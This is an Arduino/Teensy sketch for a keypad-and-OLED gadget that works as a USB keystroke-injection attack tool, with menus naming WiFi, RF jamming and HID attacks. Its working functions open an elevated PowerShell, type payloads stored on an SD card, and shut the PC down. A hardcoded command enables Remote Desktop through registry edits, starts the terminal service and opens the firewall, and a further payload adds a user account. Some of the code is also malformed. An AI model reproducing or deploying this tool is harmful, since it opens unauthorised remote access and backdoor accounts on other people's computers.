#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <Keypad.h>
#include <SD.h>
#include <SPI.h>
#include <stdio.h>
#include <Keyboard.h>

int p2=13;

File myFile;
const int chipSelect = BUILTIN_SDCARD;
const byte ROWS = 6;
const byte COLS = 3;
int UD = 0;          
int menu_set = 0;    
int cursor_id = 0;   
int temp = 0;        
int x = 0;           
int y = 0;           
int z = 0;           
char keys[ROWS][COLS] =
{
  {'M', 'U', 'B'},
  {'L', 'O', 'R'},
  {'.', 'D', '0'},
  {'1', '2', '3'},
  {'4', '5', '6'},
  {'7', '8', '9'}
};
byte rowPins[ROWS] = {2, 3, 4, 5, 6, 7}; 
byte colPins[COLS] = {8, 9, 10}; 
Keypad keypad = Keypad( makeKeymap(keys), rowPins, colPins, ROWS, COLS );
#define OLED_RESET -1
#define PAUSE 1000
#define SCREEN_HEIGHT 64
#define SCREEN_WIDTH  128
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
const unsigned char MarilynMonroe [] PROGMEM = {
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7f, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3f, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xfe, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3f, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xfe, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1f, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xfc, 0x00, 0x00, 0x03, 0xe0, 0x00, 0x00, 0x00, 0x1f, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf8, 0x03, 0x8b, 0xff, 0xfc, 0x00, 0x00, 0x00, 0x1f, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf8, 0x07, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x0f, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf8, 0x0f, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x0f, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf0, 0x1f, 0xff, 0xff, 0xff, 0x80, 0x00, 0x00, 0x0f, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf0, 0x3f, 0xff, 0xff, 0xff, 0xc0, 0x00, 0x00, 0x07, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf0, 0x3f, 0xff, 0xff, 0xff, 0xc0, 0x00, 0x00, 0x07, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf0, 0x7f, 0xff, 0xff, 0xff, 0x80, 0x00, 0x00, 0x07, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf0, 0x3f, 0xff, 0xff, 0xff, 0x80, 0x00, 0x00, 0x07, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf0, 0x3f, 0xff, 0xff, 0xff, 0x80, 0x00, 0x00, 0x07, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf0, 0x3f, 0xff, 0xff, 0xff, 0xc0, 0x00, 0x00, 0x03, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf0, 0x3f, 0xff, 0xff, 0xff, 0xe0, 0x00, 0x00, 0x03, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf0, 0x3f, 0xff, 0xff, 0xff, 0xf8, 0x00, 0x00, 0x03, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf0, 0x3f, 0xff, 0xff, 0xff, 0xf8, 0x00, 0x00, 0x01, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf0, 0x3f, 0xff, 0xff, 0xff, 0xfc, 0x00, 0x00, 0x01, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf0, 0x3f, 0xff, 0xf8, 0xff, 0xfc, 0x00, 0x00, 0x00, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf0, 0x3f, 0xff, 0xc3, 0xff, 0xfc, 0x00, 0x00, 0x00, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf8, 0x03, 0xff, 0x1f, 0xff, 0xfc, 0x00, 0x00, 0x00, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf8, 0x30, 0xff, 0xff, 0x01, 0xfc, 0x00, 0x00, 0x00, 0x7f,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf8, 0x3f, 0xff, 0xf8, 0x00, 0xfe, 0x00, 0x00, 0x00, 0x7f,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf8, 0x00, 0x3f, 0xf3, 0x01, 0xfe, 0x00, 0x00, 0x00, 0x7f,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf8, 0x02, 0x1f, 0xf7, 0x9f, 0xfe, 0x00, 0x00, 0x00, 0x7f,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xfc, 0x03, 0x5f, 0xff, 0xff, 0xfe, 0x00, 0x00, 0x00, 0x7f,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xfc, 0x0f, 0xff, 0xff, 0xff, 0xfe, 0x00, 0x00, 0x00, 0x7f,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xfc, 0x1f, 0xff, 0xff, 0xff, 0xfe, 0x00, 0x00, 0x00, 0x7f,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xfc, 0x1f, 0xff, 0xff, 0xff, 0xfc, 0x00, 0x00, 0x00, 0x7f,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xfc, 0x1f, 0xff, 0xff, 0xff, 0xfc, 0x00, 0x00, 0x00, 0x7f,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xfe, 0x0f, 0xff, 0xff, 0xff, 0xfc, 0x00, 0x00, 0x00, 0x7f,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xfe, 0x0f, 0xff, 0xff, 0xff, 0xfc, 0x00, 0x00, 0x00, 0x7f,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x0f, 0xff, 0xff, 0xff, 0xf8, 0x00, 0x00, 0x00, 0x3f,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x0f, 0xff, 0xff, 0xff, 0xf8, 0x00, 0x00, 0x00, 0x3f,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x07, 0xff, 0xff, 0xff, 0xf8, 0x00, 0x00, 0x00, 0x3f,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x03, 0xff, 0xff, 0xff, 0xf8, 0x00, 0x00, 0x00, 0x3f,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x81, 0xff, 0xff, 0xff, 0xf8, 0x00, 0x00, 0x00, 0x1f,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x80, 0xff, 0xff, 0xff, 0xf8, 0x00, 0x00, 0x00, 0x1f,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xa0, 0x7f, 0xff, 0xe3, 0xf8, 0x00, 0x00, 0x00, 0x1f,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf0, 0x1f, 0xff, 0xef, 0xf0, 0x00, 0x00, 0x00, 0x1f,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf8, 0x0f, 0x7f, 0xff, 0xf0, 0x00, 0x00, 0x00, 0x1f,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xfc, 0x07, 0xff, 0xff, 0xf0, 0x00, 0x00, 0x00, 0x1f,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xfe, 0x03, 0xff, 0xff, 0xf0, 0x00, 0x00, 0x00, 0x0f,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x01, 0xff, 0xff, 0xf0, 0x00, 0x00, 0x00, 0x0f,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x81, 0xff, 0xff, 0xe0, 0x00, 0x00, 0x00, 0x0f,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf7, 0x80, 0xff, 0xff, 0xe0, 0x00, 0x00, 0x00, 0x07,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf7, 0x80, 0xff, 0xff, 0xc0, 0x00, 0x00, 0x00, 0x07,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xfb, 0x80, 0xff, 0xff, 0x80, 0x00, 0xff, 0x00, 0x07,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xfd, 0x80, 0x7f, 0xfe, 0x00, 0x07, 0xff, 0xfe, 0x07,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xfc, 0xc0, 0x3f, 0xfc, 0x00, 0x3f, 0xff, 0xff, 0x83,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xfe, 0x40, 0x1f, 0xf0, 0x00, 0xff, 0xff, 0xff, 0xc3,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x18, 0x01, 0x80, 0x03, 0xff, 0xff, 0xff, 0xf1,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x0f, 0xff, 0xff, 0xff, 0xf9,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x3f, 0xff, 0xff, 0xff, 0xfd,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x83, 0x00, 0x00, 0x7f, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xfe, 0x41, 0x80, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xfe, 0x30, 0x80, 0x03, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x18, 0x00, 0x0f, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x88, 0x18, 0x1f, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xe0, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0x6b, 0xff, 0xc7, 0xe0, 0x03, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xc3, 0x06, 0x00, 0xe1, 0x8f, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xfd, 0xc7, 0x04, 0x00, 0x03, 0x7f, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff
};
char myChar;
unsigned int displayInt;

String sd_list[5];
int counterr=0;
void setup(){
  Serial.begin(9600);
  Keyboard.begin();
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  display.fillScreen(0);
  display.display();
  //pinMode(p0,OUTPUT);
  pinMode(p2,OUTPUT);
  if (!SD.begin(chipSelect)) {
    Serial.println("\nlOADING fail");
    return;
  }
  Serial.println("\nLOADING pass");
}

void write_file(){
  
    myFile = SD.open("erdp.txt", FILE_WRITE);
  if (myFile) {
    Serial.print("Writing to test.txt...");
    myFile.println("reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f && reg add \"HKLM\\System\\CurrentControlSet\\Services\\TermService\" /v Start /t REG_DWORD /d 2 /f && sc start termservice & netsh firewall set service type = remotedesktop mode = enable");
    myFile.close();
    Serial.println("done.");
  } else {
    Serial.println("error opening test.txt");
  }
}
String Command;
void read_file(char *file_name){
   Serial.println(file_name);
   myFile = SD.open(file_name);
  if (myFile) {
    Serial.println(file_name);
    while (myFile.available()) {
      Keyboard.write(myFile.read());
    }
    myFile.close();
  } else {
    Serial.println("error opening test.txt");
  }
}

void testing(){
  digitalWrite(p2,HIGH);
  delay(20);
  digitalWrite(p2,LOW);
  delay(800);
}
void shutdown_pc(){
  digitalWrite(p2,HIGH);
  delay(20);
 
  Serial.print("\ninside testing");
  digitalWrite(p2,LOW);
  delay(800);
Keyboard.press(KEY_SYSTEM_POWER_DOWN);
Keyboard.release(KEY_SYSTEM_POWER_DOWN);
}
void CommandAtRunBarMSWIN(String SomeCommand){
  digitalWrite(p2, HIGH);   
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI); 
  Keyboard.set_key1(KEY_R); 
  Keyboard.send_now(); 
  Keyboard.set_modifier(0); 
  Keyboard.set_key1(0); 
  Keyboard.send_now();
  delay(1500);
  Keyboard.print(SomeCommand); 
  delay(1500);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();    
  Keyboard.set_key1(0); 
  Keyboard.send_now();
  delay(1000);
  Keyboard.print("Start-Process -FilePath cmd.exe -v runAs");
  delay(500);
Keyboard.press(KEY_ENTER);
Keyboard.release(KEY_ENTER);  
  digitalWrite(p2, LOW);
}
void admin_cmd(){
        CommandAtRunBarMSWIN("powershell");
        delay(1000);
        Keyboard.set_modifier(MODIFIERKEY_SHIFT);
        Keyboard.send_now();
        Keyboard.set_key1(KEY_TAB);
        Keyboard.send_now();
        Keyboard.set_modifier(0);
        Keyboard.set_key1(0);
        Keyboard.send_now();
        Keyboard.press(KEY_ENTER);
        Keyboard.release(KEY_ENTER);
        delay(3000);
}

void exit_consoles(){
        Keyboard.println(F("exit"));
        delay(1000);
        Keyboard.println(F("exit"));
        digitalWrite(p2,LOW);
}
void add_user()
{
        digitalWrite(p2,HIGH);
        //write_file();
        admin_cmd();
        delay(500);
        char fff[]="adur.txt";
        read_file(fff);
        digitalWrite(p2,LOW);
        Keyboard.print(Command);
        exit_consoles();
}

void enable_rdp(void)
{
        digitalWrite(p2,HIGH);
        admin_cmd();
        delay(500);
        char fff[]="erdp.txt";
        read_file(fff);
        digitalWrite(p2,LOW);
        Keyboard.print(Command);
        exit_consoles();
}
String Main_Menu2[4][5][5] =
{
  {{"WIFI", "SCAN", "ATCK", "SERV", "NETT"}, {5, 6, 7, 8, 9}, {10, 11, 12, 13, 14}, {15, 16, 17, 18, 19}, {20, 21, 22, 23, 24}},
  {{"RFAT", "RFSC", "ATKK", "BLST", "JAMM"}, {30, 31, 32, 33, 34}, {35, 36, 37, 38, 39}, {40, 41, 42, 43, 44}, {9, 9, 9, 9, 9}},
  {{"CARA", "PHOB", "ATTK", "IGNI", "KILL"}, {25, 46, 47, 48, 49}, {50, 51, 52, 53, 54}, {55, 56, 57, 58, 59}, {9, 9, 9, 9, 9}},
  {{"BUNY", "SYST", "ARCH", "MEAN", "PALD"}, {"ERDP", 66, 67, 68, 69}, {"SHUT", 71, 72, 73, 74}, {"AUSR", 76, 77, 78, 79}, {9, 9, 9, 9, 9}}
};
int cursor_pp = 0;
void line_drawer(int c, int f){
  display.setTextColor(c);
  display.setCursor(f, 5);             //36, 74
  display.print("-");
  display.display();
  display.setCursor(f, 20);
  display.print("-");
  display.display();
  display.setCursor(f, 35);
  display.print("-");
  display.display();
  display.setCursor(f, 50);
  display.print("-");
  display.display();
}
int cursor_p = 0;
int line_p = 0;
void dash_drawer(int p, int c, int d){
  if (temp > 0){
    display.setTextColor(0);
    display.setCursor(c, temp);        
    display.print("-");
    display.drawLine(d, 8, 73, d, 0);  
    display.display();
  }
  display.setTextColor(1);
  display.setCursor(c, p + 5);         
  display.print("-");
  temp = p + 5;
  display.drawLine(d, 8, d, 53, 1);    
  display.display();
}
int cursor_ppt0, cursor_ppt1;
int UDt0, cursor_pt0, line_pt0, UDt1, cursor_pt1, line_pt1;
int pos1 = 0;
void line_function_recorder(int q, int w, int e, int r){
  if(e==30){
    cursor_ppt0 = q;
    UDt0 = w;
    cursor_pt0 = e;
    line_pt0 = r;
  }
  else if(e==68){
    cursor_ppt1 = q;
    UDt1 = w;
    cursor_pt1 = e;
    line_pt1 = r;
  }
}
void line_functions(){
  line_function_recorder(cursor_pp, UD, cursor_p, line_p);
  line_drawer(0, cursor_pp);
  dash_drawer(UD, cursor_p, line_p);
  line_drawer(1, cursor_pp);
}
int ran = 0;
int back_space0, back_space1, back_space2;
int UD0, UD1, UD2;
void rect_position_store(int x_val, int y_val){
    if (x_val==3){
      back_space0 = x_val;
      UD0=y_val;
    }
    else if(x_val == 41){
      back_space1 = x_val;
      UD1=y_val;
    }
    else if(x_val == 79){
      back_space2 = x_val;
      UD2=y_val;
    } 
}
int array_id = 0; 
int arry_id_x, arry_id_y, arry_id_z = 0;
int temp_y, temp_z = 0;
void rect_drawup(int p){
  rect_position_store(p,UD);
  display.setTextColor(1);
  display.setTextSize(1);
  display.drawRect(p, 3 + UD, 27, 11, 1);
  ran = 3 + UD;
  display.drawRect(p, 18 + UD, 27, 11, 0);
  display.display();
  if(p==3){
    arry_id_x-=1;
    temp_y=arry_id_x+2;
  }
  else if(p==41){
    arry_id_y-=1;
    temp_z=arry_id_y+1;
    Serial.print("i am the culprit\n");
  }
  else if(p==79){
    arry_id_z-=1;
  }
  else{
    
  }
  Serial.printf(F("array_val[%d][%d][%d]\n"),arry_id_x+1, arry_id_y, arry_id_z);
}
void rect_drawdown(int j){
  rect_position_store(j,UD);
  display.setTextColor(1);
  display.setTextSize(1);
  display.drawRect(j, 3 + UD, 27, 11, 1);
  ran = 3 + UD;
  display.drawRect(j, 3 + UD - 15, 27, 11, 0);
  display.display();
  if(j==3){
    arry_id_x+=1;
    temp_y=arry_id_x+2;
  }
  else if(j==41){
    arry_id_y+=1;
    temp_z=arry_id_y+1;
  }
  else if(j==79){
    arry_id_z+=1;
  }
  else{
    
  }
  Serial.printf(F("array_val[%d][%d][%d]\n"),arry_id_x+1, arry_id_y, arry_id_z);
}

int bt;
void up_down(char KEY){
  if (KEY == 'U' && array_id > 0){
    if (UD > 0){
      UD -= 15;
      rect_drawup(pos1);
      if (pos1 != 79){
        line_functions();
      }
    }
    if (cursor_id > 0){
      cursor_id -= 1;
    }
    else{
    }
  }
  else if (KEY == 'D' && array_id > 0){
    if (UD < 45){
      UD += 15;
      rect_drawdown(pos1);
      if (pos1 != 79){
        line_functions();
      }
    }
    if (cursor_id <= 2){
      cursor_id += 1;
    }
    else{
    }
  }
  bt= UD;
}
int bp = 0;
void blank_space(int k, int p=27){
  display.fillRect(k, 3, p, 56, 0); ///43
}
void sd_list_print(){
  for(int l=1; l<=4;l++){
    //Serial.print("\n");
    //Serial.print(sd_list[l]);
  }
}

typedef void(*foo)();
foo func[4][5][5]=
{
  {{&testing, &testing,&testing,&testing,&testing}, {&read_file, &testing,&testing,&testing,&testing}, {&testing, &testing,&testing,&testing,&testing}, {&testing, &testing,&testing,&testing,&testing}, {&testing, &testing,&testing,&testing,&testing}},
  {{&testing, &testing,&testing,&testing,&testing}, {&testing, &testing,&testing,&testing,&testing}, {&testing, &testing,&testing,&testing,&testing}, {&testing, &testing,&testing,&testing,&testing}, {&testing, &testing,&testing,&testing,&testing}},  
  {{&testing, &testing,&testing,&testing,&testing}, {&testing, &testing,&testing,&testing,&testing}, {&testing, &testing,&testing,&testing,&testing}, {&testing, &testing,&testing,&testing,&testing}, {&testing, &testing,&testing,&testing,&testing}},
  {{&enable_rdp,&shutdown_pc,&add_user,&testing,&testing}, {&testing, &testing,&testing,&testing,&testing}, {&testing, &testing,&testing,&testing,&testing}, {&testing, &testing,&testing,&testing,&testing}, {&testing, &testing,&testing,&testing,&testing}}
};

int temp1 = 0;
int temp12 = 0;
int temp2 = 0;
int temp22 = 0;
int KB=0;
int KB1=0;
boolean back = false;
int count = 0;
void image(){
  display.clearDisplay();
  display.drawBitmap(0, 0,  MarilynMonroe, 128, 64, WHITE);
  display.display();
  delay(500);
}
void key_handler(char KEY){
  //Serial.print(KEY);
  
  if (KEY == 'O'){
    image();
    back = true;
    func[arry_id_x+1][arry_id_y][arry_id_z]();
  }
  else if (KEY == '1'){
    func[0][0][0]();
  }
  else if (KEY =='2'){
    func[0][1][0]();
  }
  else if (KEY=='3'){
    func[0][0][1]();
  }
  else if (KEY == 'M' && pos1 != 79){
    if (pos1 == 3){
    arry_id_y=temp_y;
    count+=1;
    Serial.printf(F("count of y change %d\n"),count);
    }
    if (pos1 == 41){
    arry_id_z=temp_z;
    }
    //Serial.printf(F("y value %d\n"), arry_id_y);
    sd_list_print();
    display.setTextColor(1);
    display.setTextSize(1);
    if (array_id == 0){
      menu_handler(x, y, z, array_id);
      pos1 = 3;
      bp = 43;
      cursor_p = 30;
      line_p = 35;
      cursor_pp = 36;
      rect_drawup(pos1);
      line_functions();
      array_id += 1;
      menu_handler(x, y, z, array_id);
    }
    else if (array_id == 1){
      temp1 = cursor_id;
      temp12 = UD;
      KB1=cursor_id;
      menu_handler(x, y, z, array_id);
      pos1 = 41;
      bp = 79;
      cursor_p = 68;
      line_p = 73;
      cursor_pp = 74;
      rect_drawup(pos1);
      line_functions();
      array_id += 1;
      menu_handler(x, y, z, array_id);
    }
    else if (array_id == 2){
      temp22 = UD;
      KB=cursor_id;
      menu_handler(x, y, z, array_id);
      pos1 = 79;
      rect_drawup(pos1);
      line_functions();
    }
    else{
    }
  }
  if (KEY == 'B' && array_id > 0){
    //display.display();
    display.setTextColor(1);
    display.setTextSize(1);
    Serial.printf(F("pos1 = %d\n"),pos1);
    if (pos1 == 79){
      arry_id_z=0;
      arry_id_y+=1;
    }
    if (pos1 == 41){
      array_id -= 1;
      arry_id_z=0;
      //arry_id_y=0;
    }
    if (array_id == 0){
      UD = temp12;
      menu_handler(x, y, z, array_id);
      pos1 = 3;
      bp = 41;   //x axis
      cursor_p = 30;
      line_p = 35;
      cursor_pp = 36;
      blank_space(bp);
      rect_drawup(pos1);
      blank_space(bp);
      line_functions();
      array_id += 1;
      menu_handler(x, y, z, array_id);
    }
    else if (array_id == 1){
      cursor_id=KB1;
      bp = 41;
      blank_space(bp,126);
      UD = temp12;
      menu_handler(x, y, z, array_id);
      pos1 = 3;
      cursor_p = 30;
      line_p = 35;
      cursor_pp = 36;
      back_space1=0;
    }
    else if (array_id == 2){
      UD = temp22;
      bp = 79;
      blank_space(bp);
      cursor_id=KB;
      menu_handler(x, y, z, array_id);
      pos1 = 41;
      rect_drawup(pos1);
      back_space2=0;
    }
    else{
    }
  }
  else if (KEY == 'U' || KEY == 'D'){
    if (pos1 != 79){
      blank_space(bp);
      up_down(KEY);
      menu_handler(x, y, z, array_id);
    }
    else{
      up_down(KEY);
    }
  }
  else{

  }
}
int j;
int t2 = 0;
int back_cursor1, back_cursor2;
void back_menu_test(int val){
      display.fillRect(0,0,128,64,0);
      display.display();
      display.drawRect(back_space0, 3 + UD0, 27, 11, 1);
      menu_handler(x, y, z, 0);
      cursor_pp = cursor_ppt0;
      UD = UDt0;
      cursor_p = cursor_pt0;
      line_p = line_pt0;
      line_functions();
      if (val==1){
        if(back_space1 > 0){
          display.drawRect(back_space1, 3 + UD1, 27, 11, 1);             
          cursor_pp = cursor_ppt1;
          UD = UDt1;
          cursor_p = cursor_pt1;
          line_p = line_pt1;
          line_functions();    
          }
        cursor_id = back_cursor1;
        menu_handler(x, y, z, 1);
      }
      else if(val==2){
        display.fillRect(41,0,128,64,0);
        display.display();
        display.drawRect(back_space1, 3 + UD1, 27, 11, 1);
        cursor_id = back_cursor1;
        menu_handler(x, y, z, 1);
        cursor_pp = cursor_ppt1;
        UD = UDt1;
        cursor_p = cursor_pt1;
        line_p = line_pt1;
        line_functions();
        if(back_space2 > 0){
          display.drawRect(back_space2, 3 + UD2, 27, 11, 1);
        }
        cursor_id = back_cursor2;
        menu_handler(x, y, z, 2);
        UD=bt;
      }
      else{
      }
}

void menu_handler(int x, int y, int z, int arr){
  if (arr == 0){
    //Serial.print("arr =");
    //Serial.println(arr);
    for (int i = 0; i < 4; i++){ // value of x will change
      display.setCursor(5, 5 + (i * 15));
      display.print(Main_Menu2[i][y][z]);
    }
    display.display();
  }
  if (arr == 1){
    j = 0;
    back_cursor1 = cursor_id;
    for (int i = 1; i <= 5; i++){ // value of z will change
      display.setCursor(43, 5 + (j * 15));
      display.print(Main_Menu2[cursor_id][y][i]);
      j += 1;
    }
    display.display();
    t2 = cursor_id;
  }
  if (arr == 2){
    j = 0;
    back_cursor2 = cursor_id;
    for (int l = 1; l <= 5; l++){ // value of y will change
      display.setCursor(81, 5 + (j * 15));
      display.print(Main_Menu2[t2][l][cursor_id]);
      j += 1;
    }
    display.display();
  }
}

void loop(){
  char key = keypad.getKey();
  if (key != NO_KEY){
   if (back != true){
   key_handler(key);
   }
   else{
    back = false;
    back_menu_test(array_id);
   }
  }
}
